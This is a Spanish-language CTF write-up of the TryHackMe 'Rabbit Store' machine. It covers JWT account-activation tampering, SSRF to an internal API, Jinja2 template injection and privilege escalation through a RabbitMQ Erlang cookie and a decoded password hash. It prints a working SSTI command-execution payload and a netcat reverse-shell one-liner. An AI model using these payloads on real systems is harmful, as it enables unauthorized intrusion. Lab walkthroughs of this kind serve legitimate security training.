---
title: "Rabbit Store - THM | by ils00"
author: ils00
categories: [TryHackMe, Medium]
tags: [web, js, jwt, api, ssrf, ssti, rabbitmq, erlang]
render_with_liquid: false
media_subpath: /img_p/rabbit-store-thm
image:
  path: logo.webp
---

# Rabbit Store — CTF — WriteUP — THM | by Ian Lopez

Esta es una de las maneras de resolver la máquina **Rabbit Store** de **TryHackMe** con categoria **Media** en la plataforma.

![](maquina.webp)

# **Conocimientos Previos:**

- Burp Suite
- Reconocimiento de máquinas Linux
- API
- Vulnerabilidad SSRF
- JWT Token

Después de saber todo esto, vamos a comenzar!!!

**** ESPERAR 5 MINUTOS ANTES DE EMPEZAR CON LOS ESCANEOS ****

Creamos una jerarquía de directorios para poder tenerlo todo organizado.

![](jerarquia_dir.webp)

4 directoritos de trabajo

# Escaneo de Puertos:

Primeramente, lanzamos una traza ICMP hacia la máquina víctima para ver si nos responde.

![](ping.webp)

Ping a la maquina

Una vez veamos que nos responde analizamos esta traza y podemos ver el TTL que es igual a **63** por lo tanto estamos ante una maquina **Linux**.

Lanzamos el primer comando de escaneo de **Nmap** que nos dará una vista de mas o menos a que nos estamos enfrentando.

![](nmap1.webp)

Primer escaneo Nmap

`ping -p- --open    --min-rate    5000 -sS -vvv -Pn -n  [IP VÍCTIMA]`

Ahora que tenemos la visión realizaremos un escaneo más exhaustivo pero únicamente a los puertos abiertos para que no se demore mucho tiempo.

![](nmap2.webp)

Escaneo exhaustivo

Podemos ver ahora mucha mas información de los puertos abiertos de la máquina.

Vamos a investigar todo sobre esos puertos.

    **Puerto 22** → Servicio SSH corriendo, y gracias a la versión de OpenSSH podemos     saber presuntamente que estamos ante un **Ubuntu Jammy**, luego lo     corroboraremos.

    **Puerto 80** → Vemos que tenemos un servidor web levantado, ahora le echamos un     ojo.

    **Puerto 4369** → Erlang port Mapper Daemon, este demonio actúa como un servidor     de nombres para los hosts involucrados en los cálculos distribuidos de Erlang.

[https://www.cert.gov.py/reportes-proactivos-de-ciberseguridad/scan_epmd/?source=post_page-----e4b1091e7339---------------------------------------](https://www.cert.gov.py/reportes-proactivos-de-ciberseguridad/scan_epmd/?source=post_page-----e4b1091e7339---------------------------------------)

    **Puerto 25672** → Unknown, no detecta el servicio que está corriendo. Podría ser     un falso positivo.

    Pero tiene relación con el puerto 4369 que hemos visto anteriormente.

# Análisis

Como hemos visto en el escaneo al parecer esta sobre el dominio → cloudsite.thm, por lo que hay meterlo en fichero **hosts**.

![](https://miro.medium.com/v2/resize:fit:653/1*LIwPMXmArJuFvGOyqpe6ug.png)

![](web1.webp)

Ahora podemos ver la página web, vamos a analizarla para ver por donde podríamos empezar con la recolección de información.

En la parte del **Login** al entrar podemos ver que nos lleva al subdominio que es storage.cloudsite.thm, que tendremos que agregar en el fichero **host.**

Visto que tenía subdominios decidí escanear con **gobuster** en busca de directorios ocultos.

![](gobuster.webp)

Pero nada no saque nada en claro.

Por lo que intenté iniciar sesión a ver si puedo acceder por lo menos al dashboard para ver como es por dentro.

![](dashboard.webp)

Pero me da un error, porque no tengo licencia.

![](error1.webp)

Podemos ver que nos envía a un directorio que pone **inactive.**

![](token1.webp)

Analizamos un poco mas afondo y vemos que tenemos un **token JWT.**

Vamos a ver como esta hecho en jwt.io

![](token2.webp)

Podemos ver que 'Inactive' significa que no podemos acceder al dashboard.

# Primera parte de la intrusión

Lo que podemos hacer es interceptar la trama por **Burp Suite** del registro de un nuevo usuario.

![](burp1.webp)

Eso es lo que nos da el email y la password, por lo que investigando un poco el mensaje de antes. Haya usuarios “activos” e “inactivos”. Por lo tanto, vamos a enviarle al servidor que este usuario es un usuario activo para que nos cree el token con cuenta activa.

![](burp2.webp)

![](burp3.webp)

Lo pasamos por el **Repeater** y vemos que el usuario está creado correctamente.

Logueamos con el usuario que acabamos de crear:

![](acceso.webp)

Tenemos una página para subida de archivo. Investiguemos!!

![](upload1.webp)

Cuando subes algo se ve que renombra el fichero y lo mete en el directorio **/api/uploads.**

Veamos que hay despues del directorio **api**:

`gobuster dir -u [URL] -w [DICCIONARO] -t [HILOS] -c [COOKIE ACTIVADA]`

![](gobuster2.webp)

Aun poniendo la cookie activada nos manda un código de estado **403** que nos dice “Acceso no Autorizado”.

![](acceso2.webp)

Vamos a probar como funciona la subida de archivos por URL. Me he creado un servidor con pyhton3 y me he descargado el archivo. Veamos como se comporta.

![](upload2.webp)

Envío esto desde la maquina victima

![](server.webp)

Respuesta OK

![](upload3.webp)

Cuando subimos el archivo y actualizamos la pagina nos da este mensaje, si le damos click e interceptamos la trama con **Burp** podemos ver que el contenido es visible.

![](burp4.webp)

Ahora con estos datos sabemos que es vulnerable a **SSRF (Server-Side Request Forgery)** que es un tipo de vulnerabilidad en la cual nos vamos a manipular la API y la web para realizar peticiones a recursos internos a los cuales no tenemos acceso.

# Segunda Parte de la Intrusión (SSRF)

Vamos a hacerle una petición al punto final de la API. Investigando un poco me doy cuenta de que esta utilizando el framework **Express**.

![](wapa.webp)

Este framework trabaja en el puerto **3000**, por lo que la petición irá por ese puerto.

![](info.webp)

![](upload4.webp)

Esta sería la petición que haríamos. Y el resultado lo podemos descargar y leer en nuestra máquina.

![](info2.webp)

Mensaje oculto

Podemos ver que hay una parte que no nos ha salido antes en el escaneo de directorios con **Gobuser**. Veamos que tiene.

![](burp5.webp)

Nos dice que el método no es correcto, pues cambiamos de **GET** a **POST**. Pero eso no es suficiente investigando un poco di con la clave que es enviar una cadena de JSON vacía para ver como reaccionaba y BINGO!!

![](burp6.webp)

Ahora me pide unos parámetros de usuario.

![](burp7.webp)

Vemos que se refleja respeta, entonces vamos a investigar porque es posible que podamos conseguir acceso a la máquina.

l introducir este payload podemos ver información relevante de que tecnología se está usando por detrás.

**{{<%[%'}}%\\.**

![](burp8.webp)

Vemos que esta utilizando el motor de plantillas **Jinja2**, por lo tanto ahora podemos dirigir mejor el ataque.

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

He utilizado esta comando para poder sacar el la información de la **id** de la máquina y BINGOO!

![](burp9.webp)

Nos da la información, entonces es momento de entablar una conexión mediante una **reverse shell**.

`{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [IP LOCAL] [PUERTO ESCUCHA]>/tmp/f').read() }}"}`

![](nc.webp)

Estamos dentro de la máquina.

# Escalada de Privilegios

Primeramente, tenemos la flag de usuario.

![](escalada.webp)

Seguidamente investigando un poco si recordamos teníamos el servicio de las cookies de **Erlang**, que se ubican en esta ruta:

/var/lib/rabbitmq/.erlang.cookie

Le hacemos un **less** y así podemos ver el contenido mucho mejor.

![](escalada2.webp)

Debido a los escaneos realizados anteriormente, sabemos que el nodo **RabbitMQ** se está ejecutando en el servidor:

![](escalada3.webp)

Con la cookie de **Erlang**, podemos autenticarnos y comunicarnos con el nodo **RabbitMQ**. Habrá que añadir **forge** en el fichero host.

Ahora, usaremos la herramienta **rabbitmqctl** encontrada para enumerar la instancia **RabbitMQ.**

`sudo rabbitmqctl --erlang-cookie 'iUucRMxsu4kXj85M' --node rabbit@forge status`

![](escalada4.webp)

`sudo rabbitmqctl --erlang-cookie 'iUucRMxsu4kXj85M' --node rabbit@forge list_users`

![](escalada5.webp)

Investigamos y con el comando **export_definitions** podemos recuperar el hash de a contraseña de root.

![](escalada6.webp)

Si leemos el fichero salen muchas palabras pero si nos fijamos…

![](escalada7.webp)

Ahí tenemos el hash. Lo tratamos y lo invertimos para intentar sacar la contraseña de root. Información en los manuales:

[https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm)

`echo -n "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF" | base64 -d | xxd -p -c 100`

Nos da este resultado → e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585

Eliminamos los 4 bytes de sal ( **295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585** )

Entonces probamos como contraseña Y…

![](escalada8.webp)

Somos ROOT!!

# Conclusión

Es una máquina de nivel medio la cual necesita de bastante conocimiento y de muchas horas de dedicación por parte de la investigación final yo he tardado en resolverla un total de **7h** aproximadamente, CON AYUDA.

Un saludo, GOOD HACKING!!!!

~~XIII~~
